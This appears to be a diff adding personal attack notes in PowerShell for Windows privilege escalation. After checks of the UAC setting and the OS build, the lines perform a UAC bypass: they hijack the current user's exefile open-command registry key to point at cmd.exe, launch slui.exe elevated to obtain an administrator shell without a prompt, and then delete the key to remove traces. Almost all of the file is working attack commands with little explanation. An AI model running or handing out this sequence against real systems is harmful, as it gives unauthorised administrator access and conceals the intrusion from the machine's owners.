@@ -1,0 +1,11 @@
+1)(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
+	gci 'HKLM:\Software\Microsoft\Windows NT'  = this will give us the OS, version, and build
+
+
+-New-Item -Path "HKCU:\Software\classes\exefile\shell\open\command" -FORCE
+-New-ItemProperty -Path "HKCU:\Software\classes\exefile\shell\open\command" -Name "DelegateExecution" 	
+	-Value "" -Force
+-New-ItemProperty -Path "HKCU:\Software\classes\exefile\shell\open\command" -Name "(DEFAULT)" -Value "C:\Windows\System32\cmd.exe" -Force
+-Start-Process "C:\Windows\System32\slui.exe" -Verb RunAs
+-Remove-Item "HKCU:\Software\classes\exefile" -Recurse -Force
+
